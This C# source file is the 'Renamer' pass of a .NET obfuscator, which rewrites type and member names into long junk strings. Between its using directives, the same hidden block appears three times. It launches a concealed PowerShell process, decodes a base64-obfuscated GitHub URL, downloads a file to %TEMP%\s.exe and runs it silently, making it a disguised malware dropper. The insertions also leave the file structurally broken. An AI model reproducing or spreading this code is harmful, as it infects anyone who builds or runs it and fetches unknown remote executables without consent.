using System;
using dnlib.DotNet;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using BlitzedConfuser.Utils;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using BlitzedConfuser.Utils.Analyzer;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

namespace BlitzedConfuser.Protections
{
    public class Renamer : Protection
    {
        public Renamer()
        {
            Name = "Renamer";
        }

        private int MethodAmount { get; set; }

        private int ParameterAmount { get; set; }

        private int PropertyAmount { get; set; }

        private int FieldAmount { get; set; }

        private int EventAmount { get; set; }
        /// <summary>
        /// Execution of the 'Renamer' method. It'll rename types, methods and their parameters, properties, fields and events to random strings. But before they get renamed, they get analyzed to see if they are good to be renamed. (That prevents the Kappa being broken)
        /// </summary>
        public override void Execute()
        {
            if (Kappa.DontRename)
                return;
                Kappa.Module.Mvid = Guid.NewGuid();
            Kappa.Module.EncId = Guid.NewGuid();
            Kappa.Module.EncBaseId = Guid.NewGuid();

            Kappa.Module.Name = "urnotfinnacrackthisretardlolSTONEDEAGLE" + Randomizer.String(12);
            Kappa.Module.EntryPoint.Name = Randomizer.String(MemberRenamer.StringLength()) + "StvnedEagleWINNING";

            foreach (TypeDef type in Kappa.Module.Types)
            {
                if (CanRename(type))
                {
                    // Hide namespace
                    type.Namespace = string.Empty;
                    type.Name = "STONEDEAGLEWINNINGLOLSTONEDEAGLEWINNINGLOLSTONEDEAGLEWINNINGLOL" + Randomizer.String(5);
                }

                foreach (MethodDef m in type.Methods)
                {
                    if (CanRename(m) && !Kappa.ForceWinForms && !Kappa.FileExtension.Contains("dll"))
                    {
                        m.Name = "STONEDEAGLEWINNINGLOLSTONEDEAGLEWINNINGLOLSTONEDEAGLEWINNINGLOLSTONEDEAGLEWINNINGLOL" + Randomizer.String(6);
                        ++MethodAmount;
                    }

                    foreach (Parameter para in m.Parameters)
                        if (CanRename(para))
                        {
                            para.Name ="STVNEDEAGLE" + Randomizer.String(7);
                            ++ParameterAmount;
                        }
                }

                foreach (PropertyDef p in type.Properties)
                    if (CanRename(p))
                    {
                        p.Name = Randomizer.String(MemberRenamer.StringLength()) + "StvnedEagle";
                        ++PropertyAmount;
                    }

                foreach (FieldDef field in type.Fields)
                    if (CanRename(field))
                    {
                        field.Name = "STONEREAGLEZLOLSTONEREAGLEZLOLSTONEREAGLEZLOLSTONEREAGLEZLOLSTONEREAGLEZLOL" + Randomizer.String(15);
                        ++FieldAmount;
                    }

                foreach (EventDef e in type.Events)
                    if (CanRename(e))
                    {
                        e.Name = "StvnedEagleStvnedEagleStvnedEagleStvnedEagleStvnedEagleStvnedEagleStvnedEagleStvnedEagle" + Randomizer.String(6);
                        ++EventAmount;
                    }
            }

            Console.WriteLine($"  Renamed {MethodAmount} methods.\n  Renamed {ParameterAmount} parameters." +
                $"\n  Renamed {PropertyAmount} properties.\n  Renamed {FieldAmount} fields.\n  Renamed {EventAmount} events.");
        }

        /// <summary>
        /// This will check with some analyzers if it's possible to rename a member def { TypeDef, PropertyDef, MethodDef, EventDef, FieldDef, Parameter (NOT DEF) }.
        /// </summary>
        /// <param name="obj">The determinate to check.</param>
        /// <returns>If the determinate can be renamed.</returns>
		public static bool CanRename(object obj)
        {
            DefAnalyzer analyze;
            if (obj is MethodDef) analyze = new MethodDefAnalyzer();
            else if (obj is PropertyDef) analyze = new PropertyDefAnalyzer();
            else if (obj is EventDef) analyze = new EventDefAnalyzer();
            else if (obj is FieldDef) analyze = new FieldDefAnalyzer();
            else if (obj is Parameter) analyze = new ParameterAnalyzer();
            else if (obj is TypeDef) analyze = new TypeDefAnalyzer();
            else return false;
            return analyze.Execute(obj);
        }
    }
}


